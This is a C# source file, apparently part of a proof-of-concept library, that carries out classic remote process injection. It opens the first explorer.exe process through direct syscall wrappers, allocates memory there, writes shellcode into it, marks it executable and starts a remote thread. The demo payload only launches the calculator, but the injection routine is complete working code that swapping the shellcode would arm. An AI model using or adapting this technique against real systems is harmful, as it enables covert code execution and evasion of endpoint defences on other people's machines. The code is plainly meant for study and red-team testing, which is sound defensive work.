using PoCLibrary;
using System;
using System.Diagnostics;

namespace CreateThread_PoC
{
    internal static class PoC
    {
        internal static void PopCalc()
        {
            bool isWindows = PoCHelpers.CheckValidOperatingSystem();
            if (!isWindows)
            {
                return;
            }

            byte[] shellcode;

            if (Environment.Is64BitProcess)
            {
                shellcode = Shellcode.Calc64;
            }
            else
            {
                shellcode = Shellcode.Calc32;
            }

            InjectCreateRemoteThread(shellcode);
        }

        private static void InjectCreateRemoteThread(byte[] shellcode)
        {
            var target = Process.GetProcessesByName("explorer")[0];

            Console.WriteLine("Target PID: {0}", target.Id);

            var hProcess = Syscalls.OpenProcess(target.Id);
            if (hProcess == IntPtr.Zero)
            {
                throw new Exception("Failed to open handle");
            }

            Console.WriteLine("hProcess: 0x{0:X}", hProcess.ToInt64());

            var regionSize = (IntPtr)shellcode.Length;
            var hMemory = Syscalls.AllocateMemory(hProcess, regionSize);
            if (hMemory == IntPtr.Zero)
            {
                throw new Exception("Failed to allocate memory");
            }

            Console.WriteLine("hMemory: 0x{0:X}", hMemory.ToInt64());

            if (!Syscalls.WriteMemory(hProcess, hMemory, shellcode))
            {
                throw new Exception("Failed to write memory");
            }

            if (!Syscalls.ProtectMemory(hProcess, hMemory, regionSize))
            {
                throw new Exception("Failed to change memory to RX");
            }

            if (!Syscalls.CreateThread(hProcess, hMemory))
            {
                throw new Exception("Failed to create thread");
            }
        }
    }
}
